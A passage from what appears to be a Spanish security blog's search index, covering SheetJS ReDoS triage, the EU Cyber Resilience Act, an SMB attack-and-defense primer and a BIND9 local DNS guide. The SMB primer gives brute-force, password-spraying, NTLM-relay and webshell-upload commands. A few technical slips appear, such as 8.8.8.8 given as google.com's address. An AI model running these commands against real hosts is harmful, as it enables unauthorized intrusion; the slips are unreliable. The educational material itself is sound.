est\u00e9 lista.</p> <p>El primer paso fue examinar el commit en el repositorio SheetJS. El c\u00f3digo mostraba varios patrones codiciosos regex, en particular el reportado se encuentra en el comentario &lt;!--). The researcher provided a PoC demonstrating how to exploit this vulnerability.</p> <p>Podemos verificar la vulnerabilidad de la siguiente manera:</p> <p> Prueba de Concepto para ReDoS <p>Mientras que el PoC muestra un retardo de 42 segundos, la carga de trabajo crece exponencialmente con archivos m\u00e1s grandes. Un archivo con un tama\u00f1o diez veces m\u00e1s grandes que el original tardar\u00eda 4.980 segundos en procesarse, es decir, 100 veces m\u00e1s de retardo para un contenido diez veces mayor.</p> <p>En nuestro caso, las pruebas del PoC en nuestro entorno de desarrollo no mostraron ning\u00fan retardo perceptible, ya que nuestra aplicaci\u00f3n valida que el archivo sea una archivo XLS real antes de parsearlo. Esta validaci\u00f3n mitiga la explotabilidad de la vulnerabilidad en nuestra configuraci\u00f3n. Sin embargo, sigue siendo necesario abordar el problema, ya que hay m\u00e1s expresiones regulares codiciosas en la biblioteca.</p> <p>Se identificaron dos posibles soluciones:</p> <ul> <li>Detectar se\u00f1ales de explotaci\u00f3n antes de parsear el XLS.</li> <li>Actualizar la versi\u00f3n de SheetJS.</li> </ul> <p>La primera opci\u00f3n tiene inconvenientes. La comprobaci\u00f3n de patrones de explotaci\u00f3n mediante regex puede introducir inadvertidamente nuevas vulnerabilidades ReDos, y abordar todos los patrones regex problem\u00e1ticos a\u00f1ade una complejidad innecesaria.</p> <p>La segunda opci\u00f3n, aunque sencilla, se complica por el hecho de que el paquete ya no pertenece al ecosistema npm y debe de ser importado manualmente.</p> <p>Dadas estas consideraciones, nuestro equipo en Atlansec eligi\u00f3 la segunda opci\u00f3n y actualiz\u00f3 SheetJS para esta aplicaci\u00f3n.</p>"},{"location":"es/blog/posts/19-01-2025/#conclusion","title":"Conclusi\u00f3n","text":"<p>La alerta de Dependabot sobre vulnerabilidades en SheetJS sirvi\u00f3 como recordatorio de la complejidad de la gesti\u00f3n de dependencias. Abordar estos problemas requiere m\u00e1s que una simple actualizaci\u00f3n con un clic. Para tomar una buena decisi\u00f3n, nos sumergimos a fondo en las vulnerabilidades, analizando su impacto en nuestra aplicaci\u00f3n y la viabilidad de las soluciones disponibles.</p> <p>Examinando de cerca las vulnerabilidades, Atlansec ha desarrollado estrategias de mitigaci\u00f3n in situ que satisfacen las necesidades de nuestra aplicaci\u00f3n. Como en la mayor\u00eda de proyectos, no se trata s\u00f3lo de corregir las alertas, sino de comprender sus implicaciones y tomar decisiones que equilibren las necesidades de seguridad y operativas. Para nosotros, fue un recordatorio de c\u00f3mo la vigilancia y la adaptabilidad pueden convertir los retos de dependencia en oportunidades para reforzar la postura de seguridad de nuestras aplicaciones. Y lo importante que es crear una postura de seguridad tanto en el desarrollo como en el mantenimiento de la aplicaci\u00f3n, no solo desde la perspectiva de una prueba de vulnerabilidad ocasional.</p>"},{"location":"es/blog/posts/22-12-2024/","title":"Nueva Ley de Resiliencia Cibern\u00e9tica de la UE","text":"<p>El 23 de octubre de 2024, entr\u00f3 en vigor la Regulaci\u00f3n Europea de Resiliencia Cibern\u00e9tica, marcando un cambio regulatorio destinado a fortalecer la seguridad digital en toda la Uni\u00f3n Europea. En Atlansec, este hito refuerza nuestra misi\u00f3n principal: crear soluciones y productos digitales que sean seguros durante todo su ciclo de vida y garantizar la protecci\u00f3n de los entornos en los que operan.</p>"},{"location":"es/blog/posts/22-12-2024/#que-implica-este-reglamento","title":"\u00bfQu\u00e9 implica este reglamento?","text":"<p>Este nuevo marco normativo establece requisitos claros y unificados para garantizar la ciberseguridad en el dise\u00f1o, desarrollo, fabricaci\u00f3n y comercializaci\u00f3n de productos digitales. Su objetivo es cerrar las brechas de seguridad existentes y ofrecer a los consumidores y a las empresas la confianza de que los productos que adquieren est\u00e1n dise\u00f1ados para ser seguros contra las amenazas actuales y futuras.</p>"},{"location":"es/blog/posts/22-12-2024/#objetivos-claves-del-reglamento","title":"Objetivos Claves del Reglamento","text":"<ul> <li>Est\u00e1ndares de Ciberseguridad en toda Europa:   Se aplican a todos los productos conectados, directa o indirectamente a redes o dispositivos, evitando solapamientos entre distintas legislaciones de distintos Estados Miembros.</li> <li>Seguridad durante todo el Ciclo de Vida:   Los fabricantes deben implementar procesos de gesti\u00f3n de vulnerabilidades, evaluaciones de riesgos y emitir declaraciones de disconformidad.</li> <li>Mayor transparencia para los consumidores:   Facilitar la identificaci\u00f3n de productos seguros, ayudando a los usuarios a tomar decisiones informadas cuando compran hardware o software.</li> <li>Responsabilidad compartida a trav\u00e9s de la cadena de valor:   Los fabricantes, importadores y distribuidores deben garantizar el cumplimiento de estas medidas, mejorando la seguridad en todas las fases, desde el dise\u00f1o hasta el uso final.</li> </ul>"},{"location":"es/blog/posts/22-12-2024/#aspectos-claves-del-nuevo-reglamento","title":"Aspectos Claves del Nuevo Reglamento","text":"<ul> <li>Cobertura Completa:   Todo producto digital est\u00e1 sujeto a la Regulaci\u00f3n, excepto aquellos que se rigen por otras normas (por ejemplo, dispositivos m\u00e9dicos, aeronaves y autom\u00f3viles).</li> <li>Gesti\u00f3n de Vulnerabilidades:   Los fabricantes deben de garantizar la seguridad de sus productos frente a nuevas amenazas futuras.</li> <li>Marco de vigilancia del mercado:   Supervisi\u00f3n reforzada para garantizar el cumplimiento de estas nuevas leyes y salvaguardar a los usuarios finales.</li> </ul> <p>En Atlansec, creemos firmemente que la ciberseguridad debe de ser la fundaci\u00f3n de todo lo que hacemos. Nuestro compromiso es garantizar que cada soluci\u00f3n, cada l\u00ednea de c\u00f3digo y cada producto que desarrollamos se dise\u00f1e teniendo en cuenta la seguridad, no solo en entornos digitales, sino tambi\u00e9n en los sistemas e infraestructura que los sustentan. As\u00ed es como generamos confianza en un mundo digital cada vez m\u00e1s complejo.</p>"},{"location":"es/blog/posts/24-11-2024/","title":"SMB 101","text":"<p>SMB (Server Message Block) es un protocolo utilizado para compartir recursos como archivos, impresoras y directorios en una red. Utiliza una arquitectura cliente-servidor, donde el servidor pone los recursos a disposici\u00f3n y m\u00faltiples clientes pueden acceder a ellos. Aunque SMB3 introduce cifrado para proteger los datos, versiones anteriores como SMB1 transmiten informaci\u00f3n en texto plano, lo que las hace vulnerables a ciertos ataques.</p> <p>En este art\u00edculo, nos centraremos en conceptos b\u00e1sicos, comandos clave y ataques comunes relacionados con SMB, destacando el uso de herramientas como enum4linux para la enumeraci\u00f3n.</p>"},{"location":"es/blog/posts/24-11-2024/#teoria","title":"Teor\u00eda","text":""},{"location":"es/blog/posts/24-11-2024/#puertos-usados-por-smb","title":"Puertos usados por SMB","text":"<p>SMB opera principalmente en los siguientes puertos:</p> <ul> <li>445/TCP: Utilizado por SMB modernos para conexiones directas sin NetBIOS.</li> <li>139/TCP: Utilizado por versiones antiguas dependientes de NetBIOS.</li> </ul>"},{"location":"es/blog/posts/24-11-2024/#autenticacion-en-smb","title":"Autenticaci\u00f3n en SMB","text":"<p>SMB emplea varios mecanismos de sincronizaci\u00f3n:</p> <ul> <li>NTLM (LAN Manager): Vulnerable a ataques de transmisi\u00f3n y de fuerza bruta.</li> <li>Kerberos: M\u00e1s seguro, usando en entornos con Active Directory.</li> </ul>"},{"location":"es/blog/posts/24-11-2024/#enumeracion-con-smb","title":"Enumeraci\u00f3n con SMB","text":"<p>La enumeraci\u00f3n es el paso inicial para recoger informaci\u00f3n sobre los recursos compartidos, los usuarios, y otras configuraciones del servidor SMB. Aqu\u00ed hay algunas herramientas comunes para este prop\u00f3sito:</p>"},{"location":"es/blog/posts/24-11-2024/#enum4linux","title":"Enum4linux","text":"<p>Enum4linux es una herramienta de enumeraci\u00f3n dise\u00f1ada espec\u00edficamente para SMB. Nos permite identificar los recursos compartidos, pol\u00edticas de contrase\u00f1as, y los usuarios en sistemas Windows.</p> <p>Comandos comunes:</p> <pre><code>enum4linux &lt;IP&gt;\n</code></pre> <p>Modos espec\u00edficos:</p> <ul> <li> <p>Enumeraci\u00f3n de usuarios: <pre><code>enum4linux -U &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumeraci\u00f3n de recursos compartidos: <pre><code>enum4linux -S &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumeraci\u00f3n de la informaci\u00f3n del dominio: <pre><code>enum4linux -n &lt;IP&gt;\n</code></pre></p> </li> </ul> <p>Salidas t\u00edpicas:</p> <ul> <li>Recursos compartidos disponibles.</li> <li>Usuarios del sistema.</li> <li>Pol\u00edticas de contrase\u00f1as, como la caducidad o la longitud m\u00ednima.</li> </ul>"},{"location":"es/blog/posts/24-11-2024/#smbclient","title":"SMBClient","text":"<p>SMBClient es una herramienta integrada en sistemas Linux para interactuar directamente con recursos SMB.</p> <p>Ejemplo de uso:</p> <p><pre><code>smbclient //&lt;IP&gt;/&lt;nombre_recurso&gt; -U &lt;usuario&gt;\n</code></pre> Despu\u00e9s de conectarnos, podemos listar, descargar, y subir archivos con comandos similares a los de FTP.</p> <pre><code>ls # Lista el directorio actual (gesti\u00f3n de archivos y navegaci\u00f3n similar a Linux)\nget # Descarga archivos\nput # Sube archivos\n</code></pre> <p>Enumerar recursos compartidos:</p> <pre><code>smbclient -L //&lt;IP&gt; -U &lt;usuario&gt;\n</code></pre>"},{"location":"es/blog/posts/24-11-2024/#ataques-comunes-a-smb","title":"Ataques Comunes a SMB","text":""},{"location":"es/blog/posts/24-11-2024/#sesiones-nulas-null-sessions","title":"Sesiones Nulas (Null Sessions)","text":"<p>Las sesiones nulas ocurren cuando el servidor SMB permite conexiones sin autenticaci\u00f3n, exponiendo informaci\u00f3n como los recursos compartidos y usuarios.</p> <p>Enumeraci\u00f3n de sesiones nulas con smbclient:</p> <pre><code>smbclient -L //&lt;IP&gt; -N\n</code></pre> <p>Danger</p> <p>Los atacantes pueden utilizar esta informaci\u00f3n para planear ataques m\u00e1s avanzados, como ataques de fuerza bruta a contrase\u00f1as.</p>"},{"location":"es/blog/posts/24-11-2024/#fuerza-bruta-y-password-spraying","title":"Fuerza Bruta y Password Spraying","text":"<p>SMB puede ser vulnerable a ataques de fuerza bruta si no se implementan las medidas de seguridad adecuadas. Herramientas como Hydra y Medusa son comunes para este prop\u00f3sito.</p> <p>Hydra para SMB:</p> <pre><code>hydra -L users.txt -P passwords.txt smb://&lt;IP&gt;\n</code></pre> <p>NetExec:</p> <pre><code>nxc smb &lt;IP&gt; -u users.txt -p passwords.txt\n</code></pre> <p>Danger</p> <p>Los atacantes pueden ganar acceso no autorizado para compartir recursos si se descifran credenciales v\u00e1lidas.</p>"},{"location":"es/blog/posts/24-11-2024/#ntlm-relay","title":"NTLM Relay","text":"<p>Este ataque intercepta y reenv\u00eda autenticaciones NTLM para hacerse pasar por el usuario leg\u00edtimo. Los servidores SMB con la forma desactivada son especialmente vulnerables.</p> <p>Utilizando Responder:</p> <pre><code>responder -I &lt;interfaz_red&gt;\n</code></pre> <p>Tip</p> <p>Con el fin de mitigarlo, habilite la firma SMB y utilice la autenticaci\u00f3n de Kerberos en lugar de NTLM.</p>"},{"location":"es/blog/posts/24-11-2024/#credential-sniffing","title":"Credential Sniffing","text":"<p>Versiones antiguas como SMB1 transmiten credenciales en texto plano, permitiendo que los atacantes capturen las credenciales con herramientas como Wireshark.</p> <p>Filtros Wireshark:</p> <pre><code>tcp.port == 445\n</code></pre> <p>Danger</p> <p>Un atacante puede utilizar las credenciales interceptadas para acceder al servidor SMB.</p>"},{"location":"es/blog/posts/24-11-2024/#carga-de-archivos-para-rce","title":"Carga de archivos para RCE","text":"<p>Si un recurso SMB permite la escritura, un atacante puede subir un archivo malicioso, como una web shell, para ejecutar c\u00f3digo remotamente.</p> <p>Subiendo un archivo con SMBClient:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;nombre_recurso&gt; -U &lt;usuario&gt;\nput webshell.aspx\n</code></pre> <p>Danger</p> <p>Esto puede comprometer al servidor, permitiendo la ejecuci\u00f3n de comandos o la instalaci\u00f3n de malware.</p>"},{"location":"es/blog/posts/24-11-2024/#defensas-en-contra-de-los-exploits-smb","title":"Defensas en contra de los exploits SMB","text":"<ol> <li>Deshabilita SMB1: Est\u00e1 obsoleto y es vulnerable. Sustit\u00fayelo ya sea por SMB2 o SMB3:     <pre><code>Set-SmbServerConfiguration -EnableSMB1Protocol $false\n</code></pre></li> <li>Habilita SMB Singing: Para prevenir ataques de retransmisi\u00f3n NTLM.</li> <li>Restringe los permisos: Asegura que los recursos compartidos est\u00e1n protegidos con permisos estrictos.</li> <li>Cifrado SMB3: SMB3 permite cifrar el tr\u00e1fico, protegiendo as\u00ed contra ataques de sniffing.</li> <li>Monitorizaci\u00f3n peri\u00f3dica: Utiliza herramientas como Splunk o Wireshark para detectar actividad an\u00f3mala.</li> </ol> <p>En el siguiente art\u00edculo de esta serie sobre SMB hablaremos de errores comunes de implementaci\u00f3n y de algunas vulnerabilidades conocidas de algunas implementaciones del protocolo.</p>"},{"location":"es/blog/posts/26-01-2025%281%29/","title":"Configurando un DNS local","text":"<p>En este art\u00edculo, vamos a explorar qu\u00e9 es un DNS y c\u00f3mo funciona esta jerarqu\u00eda para que puedas comprender mejor su papel crucial en la navegaci\u00f3n por internet. Desde los servidores ra\u00edz que act\u00faan como el punto de partida, pasando por servidores TLD y autoritativos, llegamos al DNS local, la pieza clave que conecta todo este sistema global con tu red dom\u00e9stica o empresarial. \u00a1Prep\u00e1rate para entender c\u00f3mo puedes configurar tu propio DNS local y optimizar la navegaci\u00f3n de tu entorno! </p> <p>As\u00ed que, si quieres llevar tu conocimiento al siguiente nivel y descubrir c\u00f3mo este sistema jer\u00e1rquico garantiza que cada p\u00e1gina que visitas est\u00e9 a un clic de distancia, sigue leyendo.</p> <p>Si alguna vez te has preguntado c\u00f3mo funciona Internet detr\u00e1s de escena, seguramente has escuchado hablar del DNS (Domain Name System). Este sistema es como la gu\u00eda telef\u00f3nica de la web: convierte nombres de dominio f\u00e1ciles de recordar, como www.ejemplo.com, en direcciones IP que las computadoras utilizan para conectarse entre s\u00ed. Aunque este proceso parece m\u00e1gico, es el resultado de un sistema jer\u00e1rquico cuidadosamente organizado que va desde servidores ra\u00edz hasta el nivel m\u00e1s cercano a ti: el DNS local. </p>"},{"location":"es/blog/posts/26-01-2025/","title":"Gu\u00eda completa sobre DNS: Visi\u00f3n general, Configuraci\u00f3n y Seguridad","text":"<p>Comprender el DNS (Domain Name System ) es esencial para cualquier persona interesada en el funcionamiento de Internet. El DNS juega un papel crucial en la traducci\u00f3n de nombres de dominio legibles por el ser humano a direcciones IP, lo que garantiza una fluidez en la navegaci\u00f3n web.</p> <p>Esta gu\u00eda le guiar\u00e1 a trav\u00e9s de:</p> <ul> <li>Las estructuras jer\u00e1rquicas del DNS y sus componentes claves.</li> <li>Los tipos de consultas DNS y como funcionan.</li> <li>Las preocupaciones sobre la seguridad del DNS y medidas de protecci\u00f3n como DNSSEC.</li> <li>La Configuraci\u00f3n de un servidor DNS local mediante BIND9 para la mejora del rendimiento, privacidad y el filtrado de contenido.</li> </ul> <p>Asi que, si quiere llevar sus conocimientos al siguiente nivel y descubrir como este sistema jer\u00e1rquico garantiza que cada p\u00e1gina web que visites est\u00e9 a un solo clic de distancia, sigue leyendo.</p>"},{"location":"es/blog/posts/26-01-2025/#lo-basico-que-hace-un-dns","title":"Lo b\u00e1sico: \u00bfQu\u00e9 Hace Un DNS?","text":"<p>Cuando introduces un nombre de dominio en tu navegador, el ordenador no entiende ese nombre directamente. En su lugar, tu dispositivo inicia un proceso llamado resoluci\u00f3n de nombre (domain resolution) para encontrar la direcci\u00f3n IP correspondiente. Los servidores DNS se encargan de esta resoluci\u00f3n mediante un sistema estructurado y jer\u00e1rquico.</p>"},{"location":"es/blog/posts/26-01-2025/#la-jerarquia-de-los-servidores-dns","title":"La Jerarqu\u00eda de los Servidores DNS","text":"Jerarqu\u00eda de Servidores DNS para Google <p>El DNS opera como un sistema jer\u00e1rquico distribuido. Cada nivel en esta jerarqu\u00eda juega un papel espec\u00edfico en la traducci\u00f3n de nombres de dominio en direcciones IP. As\u00ed es como funciona:</p>"},{"location":"es/blog/posts/26-01-2025/#resolucion-recursiva-la-consulta-dns-comienza-aqui","title":"Resoluci\u00f3n Recursiva (La Consulta DNS Comienza Aqu\u00ed)","text":"<ul> <li>Cuando escribes una URL en tu navegador, tu dispositivo manda una petici\u00f3n a un servidor DNS recursivo (recursive resolver). Este suele estar proporcionado por su proveedor de servicios de Internet (ISP) or un servicio de terceros como Google Public DNS o Cloudflare.</li> <li>El trabajo del servidor DNS recursivo consiste en gestionar su consulta y obtener la direcci\u00f3n IP correcta poni\u00e9ndose en contacto con otros servidores DNS en su nombre.</li> </ul>"},{"location":"es/blog/posts/26-01-2025/#servidores-dns-raiz-el-punto-de-partida","title":"Servidores DNS Ra\u00edz (El Punto de Partida)","text":"<ul> <li>Si el servidor DNS recursivo no tiene todav\u00eda la direcci\u00f3n IP en cach\u00e9, contacta con uno de los 13 servidores DNS ra\u00edz que est\u00e1n distribuidos globalmente.</li> <li>Estos servidores no almacenan mapeos espec\u00edficos de dominio a IP, sino que apuntan al siguiente nivel en la jerarqu\u00eda: Servidores de Dominio de Nivel Superior (TLD).</li> </ul>"},{"location":"es/blog/posts/26-01-2025/#top-level-domain-tld-servers","title":"Top-Level Domain (TLD) Servers","text":"<ul> <li>Los servidores TLD gestionan los dominios en funci\u00f3n de su sufijo, como <code>.com</code>, <code>.org</code>, o <code>.net</code>. Por ejemplo, si est\u00e1s visitando <code>google.com</code>, el servidor ra\u00edz dirigir\u00e1 su consulta al servidor TLD <code>.com</code>.</li> <li>El servidor TLD proporciona entonces la direcci\u00f3n del servidor de nombres autoritativo para el dominio solicitado.</li> </ul>"},{"location":"es/blog/posts/26-01-2025/#servidores-de-nombres-autoritativo","title":"Servidores de Nombres Autoritativo","text":"<ul> <li>El servidor de nombres autoritativo es el \u00faltimo paso de la cadena. Contiene los registros DNS reales para el dominio, incluyendo la direcci\u00f3n IP del servidor web.</li> <li>En el caso de Google, si buscas <code>google.com</code>, el servidor autorizado devolver\u00e1 la direcci\u00f3n IP correspondiente (por ejemplo, <code>8.8.8.8</code>).</li> </ul>"},{"location":"es/blog/posts/26-01-2025/#devolucion-de-la-respuesta","title":"Devoluci\u00f3n de la Respuesta","text":"<ul> <li>Una vez que el servidor DNS recursivo consigue la direcci\u00f3n IP del servidor autoritativo, la devuelve a tu navegador. Entonces, tu navegador puede utilizar la direcci\u00f3n IP para conectarse al servidor web y cargar la p\u00e1gina.</li> </ul>"},{"location":"es/blog/posts/26-01-2025/#tipos-de-consultas-dns","title":"Tipos de Consultas DNS","text":"<p>Durante este proceso, hay tres tipos principales de consultas DNS:</p> <ol> <li>Consultas Recursivas: El servidor DNS recursivo asume toda la responsabilidad de encontrar la direcci\u00f3n IP y devolv\u00e9rsela al cliente.</li> <li>Consultas Iterativas: El servidor DNS recursivo consulta cada servidor DNS en secuencia, recibiendo referencias al siguiente servidor hasta que encuentra la direcci\u00f3n IP.</li> <li>Consultas No Recursivas: Si el servidor DNS recursivo ya tiene la informaci\u00f3n en cach\u00e9, devuelve inmediatamente el resultado.</li> </ol>"},{"location":"es/blog/posts/26-01-2025/#registros-dns-componentes-basicos","title":"Registros DNS: Componentes B\u00e1sicos","text":"<p>El servidor de nombres autoritativo almacena los diferentes tipos de registros DNS que contienen informaci\u00f3n espec\u00edfica acerca del dominio. Algunos de los registros m\u00e1s comunes son: - Registro A: Asigna un dominio a una direcci\u00f3n IPv4. - Registro AAAA: Asigna un dominio a una direcci\u00f3n IPv6. - Registro CNAME: Apunta un dominio a otro (utilizado para alias). - Registro MX: Especifica los servidores de correo para la entrega de correo electr\u00f3nico. - Registro TXT: Proporciona informaci\u00f3n adicional sobre un dominio, a menudo utilizado para verificaci\u00f3n.</p>"},{"location":"es/blog/posts/26-01-2025/#cache-dns-acelerando-las-cosas","title":"Cach\u00e9 DNS: Acelerando las cosas","text":"<p>Para mejorar el rendimiento y reducir la carga de los servidores DNS, se utiliza el almacenamiento en cach\u00e9 a varios niveles:</p> <ul> <li>Cach\u00e9 del navegador: Tu navegador almacena temporalmente las respuestas DNS de los dominios que visitas con frecuencia.</li> <li>Cach\u00e9 del Sistema Operativo: El sistema operativo de tu dispositivo tambi\u00e9n almacena en cach\u00e9 las respuestas DNS para evitar consultas redundantes.</li> <li>Cach\u00e9 del servidor DNS recursivo: El servidor DNS recursivo mantiene una cach\u00e9 de los dominios consultados recientemente para acelerar futuras b\u00fasquedas.</li> </ul> <p>El almacenamiento en cach\u00e9 garantiza que la mayor\u00eda de las consultas DNS no tengan que atravesar toda la jerarqu\u00eda, haciendo que la b\u00fasqueda en Internet sea m\u00e1s r\u00e1pida y eficiente.</p> <p>Para observar c\u00f3mo el almacenamiento en cach\u00e9 de DNS reduce el tiempo de respuesta, vamos a utilizar el comando dig prestando atenci\u00f3n al Query Time para el dominio google:</p> <p>En la primera prueba obtuvimos:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 25335\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             215     IN      A       142.250.200.142\n\n;; Query time: 68 msec\n</code></pre> <p>Y en la segunda prueba:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 44597\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             287     IN      A       142.250.200.78\n\n;; Query time: 36 msec\n</code></pre> <p>Como podemos ver, el tiempo ha decrementado.</p>"},{"location":"es/blog/posts/26-01-2025/#seguridad-del-dns","title":"Seguridad del DNS","text":"<p>A pesar de su importancia, el sistema DNS tiene vulnerabilidades que pueden ser explotadas por los atacantes. Algunos problemas comunes incluyen:</p> <ul> <li>DNS Spoofing/Poisoning: Los actores maliciosos inyectan registros DNS falsos en la cach\u00e9, redirigiendo a los usuarios a p\u00e1ginas web fraudulentas.</li> <li>Ataques DDoS: Este es uno de los ataques m\u00e1s conocidos que consiste en inundar el servidor DNS con tr\u00e1fico para interrumpir el servicio.</li> <li>Ataques Man-in-the-Middle: Consiste en interceptar consultas DNS para modificar sus respuestas.</li> </ul> <p>Para combatir estas amenazas, tecnolog\u00edas como DNSSEC (Domain Name System Security Extensions) a\u00f1ade firmas criptogr\u00e1ficas a los registros DNS, garantizando su autenticidad. Imagina que quieres visitar google.com:</p> <ol> <li>Tu navegador solicita la direcci\u00f3n IP para google.com desde el servidor DNS recursivo.</li> <li>El servidor DNS recursivo comprueba las firmas DNSSEC en cada nivel (root, .com, and google.com).</li> <li>Si todas las firmas son v\u00e1lidas, el servidor DNS recursivo devuelve la direcci\u00f3n IP.</li> <li>Si alguna de las firmas falla, el servidor DNS recursivo sabe que los datos han sido manipulados y los descarta.</li> </ol>"},{"location":"es/blog/posts/26-01-2025/#configurar-un-servidor-dns-local-por-motivos-de-privacidad-y-rendimiento","title":"Configurar un servidor DNS local por motivos de Privacidad y Rendimiento","text":"<p>Si has llegado hasta aqu\u00ed, \u00a1enhorabuena! Ya conoces los principios b\u00e1sicos y claves de los servidores DNS. Con este conocimiento, est\u00e1s preparado para ponerte manos a la obra y configurar tu propio servidor DNS local. Hacerlo te abre un mundo de posibilidades: puedes filtrar contenido no deseado en tu red, mejorar el rendimiento de la navegaci\u00f3n e incluso navegar por internet de manera segura, minimizando el riesgo de virus y otras amenazas online.</p>"},{"location":"es/blog/posts/26-01-2025/#bind9","title":"Bind9","text":"<p>En este articulo, utilizaremos el servidor DNS BIND9 para configurar un servidor DNS directamente en nuestro ordenador. Este enfoque pr\u00e1ctico nos permitir\u00e1 experimentar c\u00f3mo es tener un servidor DNS completamente funcional ejecut\u00e1ndose en nuestra propia red, \u00a1desde la comodidad de nuestra propia m\u00e1quina!</p> <p>Primero, vamos a instalar bind9:</p> <pre><code>sudo apt update\nsudo apt install bind9 dnsutils\n</code></pre> <p>Configuramos nuestro sistema para que primero pregunte al servidor DNS local que nos hemos instalado:</p> <pre><code>sudo nano /etc/resolv.conf\n</code></pre> <p>A\u00f1adimos el servidor local como primera l\u00ednea:</p> <pre><code>nameserver 127.0.0.1\n</code></pre> <p>Despu\u00e9s, editaremos el archivo de configuraci\u00f3n:</p> <pre><code>sudo nano /etc/bind/named.conf.options\n</code></pre> <p>Elimina todo lo que contiene dicho archivo y a\u00f1ade lo siguiente:</p> <pre><code>acl \"trusted\" {\n    192.168.0.0/16;\n    localhost;\n};\n\noptions {\n    directory \"/var/cache/bind\";\n\n    recursion yes;\n    allow-query { trusted; };\n\n    forwarders {\n        1.1.1.3;\n        1.1.1.2;\n    };\n\n    dnssec-validation auto;\n\n    listen-on { any; };\n    listen-on-v6 { any; };\n};\n</code></pre> <p>Esta ACL especifica qu\u00e9 clientes son considerados \"de confianza\" y pueden interactuar con el servidor DNS.</p> <p>El bloque de opciones contiene ajustes globales para el servidor BIND9. Vamos a repasar cada l\u00ednea:</p> <ul> <li> <p><code>directory \"/var/cache/bind\";</code> Especifica el directorio donde BIND almacenar\u00e1 su cach\u00e9 y archivos relacionados.</p> </li> <li> <p><code>recursion yes;</code> Habilita las consultas recursivas, lo que significa que el servidor resolver\u00e1 las consultas DNS en nombre de los clientes consultado otros servidores DNS si no tiene la respuesta en cach\u00e9 o localmente configurada.</p> </li> <li> <p><code>allow-query { trusted; };</code> Restringe qu\u00e9 clientes pueden enviar consultas al servidor. Solo los clientes definidos en la ACL de confianza (red local y localhost) pueden realizar consultas al servidor DNS.</p> </li> <li> <p><code>forwarders { 1.1.1.3; 1.1.1.2; };</code> Define los servidores DNS externos (en este caso, los servidores DNS filtrados de Cloudflare) a los que el servidor reenviar\u00e1 las consultas que no puede resolver localmente. El servidor act\u00faa como un intermediario, reenviando consultas no resueltas a estos servidores upstream.</p> <ul> <li>1.1.1.3: Bloquea el contenido malicioso.</li> <li>1.1.1.2: Bloquea contenido relacionado con malware.</li> </ul> </li> <li> <p><code>dnssec-validation auto;</code> Habilita la validaci\u00f3n DNSSEC autom\u00e1ticamente, garantizando la autenticidad y la integridad de las respuestas del DNS usando firmas criptogr\u00e1ficas.</p> </li> </ul> <p>Con esta configuraci\u00f3n, hemos implementado medidas b\u00e1sicas de seguridad confiando en los servidores DNS de Cloudflare para gestionar las consultas reenviadas, garantizando que las respuestas est\u00e1n filtradas para evitar dominios maliciosos.</p> <p>Podemos comprobar nuestra mejora de rendimiento haciendo lo mismo que antes, utilizando el comando dig para buscar el Query Time del dominio google.com.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56385\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: 2b2a789af74949000100000067966b06329ed55c149fd975 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             300     IN      A       142.250.200.142\n\n;; Query time: 67 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>Despu\u00e9s de la segunda consulta, conseguimos un tiempo de respuesta de 0ms, ya que nuestro servidor DNS local recupera eficazmente el resultado de su cach\u00e9.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51691\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: a2419e6c5e03859d0100000067966b096b0ad0c0a30e2273 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             297     IN      A       142.250.200.142\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>Podemos ver que el SERVER al que estamos preguntando es <code>127.0.0.1</code>ya que es nuestro servidor DNS bind9.</p> <p>Sin embargo, \u00bfy si queremos ir un paso m\u00e1s all\u00e1 y aplicar nuestras propias restricciones? Ya sea para mejorar la seguridad, bloquear sitios webs espec\u00edficos o crear un entorno de Internet m\u00e1s seguro para los ni\u00f1os, podemos configurar BIND9 para restringir el acceso a una lista personalizada de dominios. Esto nos da un control total sobre qu\u00e9 contenido est\u00e1 o no permitido en nuestra red, adaptando el servidor DNS para satisfacer nuestras necesidades espec\u00edficas.</p>"},{"location":"es/blog/posts/26-01-2025/#bloqueo-de-dominios-especificos-usando-bind9","title":"Bloqueo de dominios 